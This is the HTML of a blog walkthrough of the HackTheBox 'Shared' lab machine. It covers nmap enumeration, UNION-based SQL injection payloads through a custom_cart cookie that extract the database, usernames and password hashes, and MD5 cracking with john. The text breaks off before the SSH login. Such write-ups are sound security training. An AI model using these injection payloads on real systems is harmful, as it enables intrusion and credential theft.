@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Hackthebox - Shared - Saad Akhtar</title><meta name="Description" content="Hackthebox medium machine Shared walkthrough &amp; tutorial.."><meta property="og:title" content="Hackthebox - Shared" />
+<meta property="og:description" content="Hackthebox medium machine Shared walkthrough &amp; tutorial.." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-shared/" /><meta property="og:image" content="/hackthebox-shared/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-12T12:08:21+05:00" />
+<meta property="article:modified_time" content="2022-11-12T12:08:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-shared/0.png"/>
+<meta name="twitter:title" content="Hackthebox - Shared"/>
+<meta name="twitter:description" content="Hackthebox medium machine Shared walkthrough &amp; tutorial.."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-shared/" /><link rel="prev" href="/hackthebox-trick/" /><link rel="next" href="/hackthebox-carpediem/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hackthebox - Shared",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-shared\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-shared\/0.png",
+                            "width":  1388 ,
+                            "height":  1058 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  935 ,
+        "url": "\/hackthebox-shared\/","datePublished": "2022-11-12T12:08:21+05:00","dateModified": "2022-11-12T12:08:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Hackthebox medium machine Shared walkthrough \u0026 tutorial.."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hackthebox - Shared</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-12">2022-11-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;935 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-shared/0.png"
+        data-srcset="/hackthebox-shared/0.png, /hackthebox-shared/0.png 1.5x, /hackthebox-shared/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-shared/0.png"
+        title="Hackthebox medium machine Shared walkthrough &amp; tutorial.." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Medium Machine Shared from HackTheBox.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -vv 10.10.11.172 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsjcm1tYGyIVXP0ioF03lG4xMs6JWNDImzpWnDFVmg7erh4KRulrJvaR2MGkZ4UeVQFz8jva8xsG8r9ALtST48+wRF9TniLsHcuwvRop3EVEmlImth1cjG1+BHyIwoaf7Z9R5ocRw9r5PGDO8hydQTwGv4n/foMQJOu3WhIsz8532utbYpdiERTIAbB2xtC4eolcDNLJ9LptizWpUS5/Jm5BrpYODb6OIM8rWjZyJqJgehA63kqN5oEMP6eoiW+t95DuZoLPLtH+/Y4GAO5gjYmj+rfRDSYlBXQQ94hk/yxqvfMI/jfIgEPXLuCBaE2WPm+SYDUZ0HsuV70F6dobs+q/SNYT1jjSgQFi6hA1ZpSIjGPBl9aaB+vEF5fQcA+z/nWwfaYMqUu3utQNvi0ejZ3UQgbF6P0pVD/NlbX9jT2cRC3Og3rL2Mhhq7kIXYxS6n1UxNbhYD7PQHs7lhDMIinTj2U8Z1TjFujWWO2VGzarJXtZcFKV2TPfEwilN0yM8<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBljy8WbFpXolV3MJQIZVSUOoLE6xK6KMEF5B1juVK5pOmj3XlfkjDwPbQ5svG18n7lIuaeFMpggTrftBjUWKOk</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWVTnJGzAgwIazusSrn+ULowTr1vEHVIVQzxj0u2W+y
+</span></span><span class="line"><span class="cl">80/tcp  open  http     syn-ack nginx 1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://shared.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http syn-ack nginx 1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://shared.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   h2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>*.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US/localityName<span class="o">=</span>None
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>*.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US/localityName<span class="o">=</span>None
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-03-20T13:37:14
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2042-03-15T13:37:14
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   fb0b 4ab4 9ee7 d95d ae43 239a fca4 c59e
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 6ccd a103 5d29 a441 0aa2 0e32 79c4 83e1 750a d0a0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIDgTCCAmmgAwIBAgIUfRY/CTV1JRpsij80nJ2qVo8C0sUwDQYJKoZIhvcNAQEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BQAwUDELMAkGA1UEBhMCVVMxDTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUx
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DDAKBgNVBAoMA0hUQjEVMBMGA1UEAwwMKi5zaGFyZWQuaHRiMB4XDTIyMDMyMDEz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MzcxNFoXDTQyMDMxNTEzMzcxNFowUDELMAkGA1UEBhMCVVMxDTALBgNVBAgMBE5v
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bmUxDTALBgNVBAcMBE5vbmUxDDAKBgNVBAoMA0hUQjEVMBMGA1UEAwwMKi5zaGFy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZWQuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4vqqZAfqdwC+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Bt01RMljAzeU+To4hKQ9PjbDuRzVFNEXgpxC3YAYnDsk+J3r9lsnM1UND7gDuCsN
+</span></span><span class="line"><span class="cl"><span class="p">|</span> r0Gxb+j5o+T8Qxg6iwn6bR/LgXslpW+laN1EUil2kkINxOCmgNKsGpRBiKl2nzXo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DaMGw0zva7n0FIWH7LBebC6E3Ix37hIrKZqQPUlHh0lZdAWg4WWplVXqMXCbGsnR
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tWt3t0XBnbbKn8PnsChlX7eTxh/SMsh6zKNC7s2qoJYJt9fqcm+sVyIeKVR55nQW
+</span></span><span class="line"><span class="cl"><span class="p">|</span> obVENYdjJfpXqP+CLE+Y1b9lIEyQ+xRVgzkg7e1trWa0IbM5+gySi0Pk4cM1/W1L
+</span></span><span class="line"><span class="cl"><span class="p">|</span> PkmdrH/jeQIDAQABo1MwUTAdBgNVHQ4EFgQUybpz156b8qt/qvfSXeo8TBjan/8w
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HwYDVR0jBBgwFoAUybpz156b8qt/qvfSXeo8TBjan/8wDwYDVR0TAQH/BAUwAwEB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /zANBgkqhkiG9w0BAQsFAAOCAQEASF9WK54bYGFb7v92oL4krO+04Qsr+kyuKwwk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lDarRxEdG8b63zf6ug9crDCNmmEQF+XL5TsRyIIBdZheYzZnxmeSueKrRq4oLusb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LWfsU4vvdUkIp+D6mt9RlT/N7U/LgNZSHLR40V71bAt+gjj98cBAqn5XR0WJY/Eu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecG51FuQe6/7VCKje3tzTZtNtSBleT8Jy3lRkx4pa6GwkY/KiJbXFRqAud8Xdblz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 5mhibkaWk8spaNxc6S6V7xyMC/kjcznfEKHVvocL32kUZfaN8Af9XaVN9UYhecu/
+</span></span><span class="line"><span class="cl"><span class="p">|</span> znFVUvL3buLlMUy7TLdw4bJNJUdFXviq++Gu/n1uER6nSLMwGw<span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   h2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enumerating the web it is redirecting us to the domain <em>shared.htb</em> so let&rsquo;s add this to our <em>/etc/hosts</em> file and visit the page again.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/1.png" title="Website" data-thumbnail="/hackthebox-shared/1.png" data-sub-html="<h2>Website</h2><p>Website</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/1.png"
+            data-srcset="/hackthebox-shared/1.png, /hackthebox-shared/1.png 1.5x, /hackthebox-shared/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/1.png" width="1366" height="580" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>From the looks of it, it&rsquo;s a online shopping website where we can add some products to cart and buy them. For checking out the functionality we can buy some stuff and check what it can lead us to.</p>
+<p>I simply added a product to the cart and proceeded to checkout. Here it reveals a subdomain <em>checkout.shared.htb</em>. We can add this to our <em>/etc/hosts/</em> file as well and proceed further.</p>
+<p>We are redirected to the following page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/2.png" title="checkout.shared.htb" data-thumbnail="/hackthebox-shared/2.png" data-sub-html="<h2>checkout.shared.htb</h2><p>checkout.shared.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/2.png"
+            data-srcset="/hackthebox-shared/2.png, /hackthebox-shared/2.png 1.5x, /hackthebox-shared/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/2.png" width="1366" height="567" />
+    </a><figcaption class="image-caption">checkout.shared.htb</figcaption>
+    </figure></p>
+<p>Here we have a bunch of stuff we can mess around with. Looking at the cookies, we have a cookie <em>custom_cart</em> whose value is reflected back in our page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/3.png" title="custom_cart" data-thumbnail="/hackthebox-shared/3.png" data-sub-html="<h2>custom_cart cookie</h2><p>custom_cart</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/3.png"
+            data-srcset="/hackthebox-shared/3.png, /hackthebox-shared/3.png 1.5x, /hackthebox-shared/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/3.png" width="192" height="25" />
+    </a><figcaption class="image-caption">custom_cart cookie</figcaption>
+    </figure></p>
+<p>It&rsquo;s a key value pair and manipulating the key shows us different output on the product column.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/4.png" title="Manipulating the cookie" data-thumbnail="/hackthebox-shared/4.png" data-sub-html="<h2>Manipulating the cookie</h2><p>Manipulating the cookie</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/4.png"
+            data-srcset="/hackthebox-shared/4.png, /hackthebox-shared/4.png 1.5x, /hackthebox-shared/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/4.png" width="820" height="324" />
+    </a><figcaption class="image-caption">Manipulating the cookie</figcaption>
+    </figure></p>
+<p>I tried several SQL injections and the following payload worked.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT 1,2,3 -- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/5.png" title="SQL Injection" data-thumbnail="/hackthebox-shared/5.png" data-sub-html="<h2>SQL Injection</h2><p>SQL Injection</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/5.png"
+            data-srcset="/hackthebox-shared/5.png, /hackthebox-shared/5.png 1.5x, /hackthebox-shared/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/5.png" width="878" height="321" />
+    </a><figcaption class="image-caption">SQL Injection</figcaption>
+    </figure></p>
+<p>Checking the database.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT 1,database(),3 -- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/6.png" title="DB name" data-thumbnail="/hackthebox-shared/6.png" data-sub-html="<h2>DB Name</h2><p>DB name</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/6.png"
+            data-srcset="/hackthebox-shared/6.png, /hackthebox-shared/6.png 1.5x, /hackthebox-shared/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/6.png" width="826" height="365" />
+    </a><figcaption class="image-caption">DB Name</figcaption>
+    </figure></p>
+<p>Getting table name.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT 1,table_name, 3 FROM information_schema.tables WHERE table_schema = &#39;</span><span class="n">checkout</span><span class="s1">&#39; -- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/7.png" title="Table Name" data-thumbnail="/hackthebox-shared/7.png" data-sub-html="<h2>Table Name</h2><p>Table Name</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/7.png"
+            data-srcset="/hackthebox-shared/7.png, /hackthebox-shared/7.png 1.5x, /hackthebox-shared/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/7.png" width="786" height="314" />
+    </a><figcaption class="image-caption">Table Name</figcaption>
+    </figure></p>
+<h2 id="foothold">Foothold</h2>
+<p>Assuming there are columns <em>username</em> and <em>password</em> we can extract user information.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT 1,username, 3 FROM user -- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/8.png" title="username" data-thumbnail="/hackthebox-shared/8.png" data-sub-html="<h2>username</h2><p>username</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/8.png"
+            data-srcset="/hackthebox-shared/8.png, /hackthebox-shared/8.png 1.5x, /hackthebox-shared/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/8.png" width="844" height="348" />
+    </a><figcaption class="image-caption">username</figcaption>
+    </figure></p>
+<p>Extracting the password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT 1,password, 3 FROM user -- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/9.png" title="password" data-thumbnail="/hackthebox-shared/9.png" data-sub-html="<h2>password</h2><p>password</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/9.png"
+            data-srcset="/hackthebox-shared/9.png, /hackthebox-shared/9.png 1.5x, /hackthebox-shared/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/9.png" width="876" height="312" />
+    </a><figcaption class="image-caption">password</figcaption>
+    </figure></p>
+<p>We now have a password hash and a username. Let&rsquo;s crack the password using john.</p>
+<p>The hash is MD5.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/10.png" title="MD5 Hash" data-thumbnail="/hackthebox-shared/10.png" data-sub-html="<h2>MD5 Hash</h2><p>MD5 Hash</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/10.png"
+            data-srcset="/hackthebox-shared/10.png, /hackthebox-shared/10.png 1.5x, /hackthebox-shared/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/10.png" width="944" height="164" />
+    </a><figcaption class="image-caption">MD5 Hash</figcaption>
+    </figure></p>
+<p>Save the hash in a file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;fc895d4eddc2fc12f995e18c865cf273&#34;</span> &gt; john.hash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Crack the hash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --format<span class="o">=</span>Raw-MD5 --wordlist<span class="o">=</span>/home/saad/Documents/wordlists/rockyou.txt john.hash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/11.png" title="Cracked Hash" data-thumbnail="/hackthebox-shared/11.png" data-sub-html="<h2>Cracked Hash</h2><p>Cracked Hash</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/11.png"
+            data-srcset="/hackthebox-shared/11.png, /hackthebox-shared/11.png 1.5x, /hackthebox-shared/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/11.png" width="1184" height="285" />
+    </a><figcaption class="image-caption">Cracked Hash</figcaption>
+    </figure></p>
+<p>Let&rsquo;s try these creds in ssh.</p>
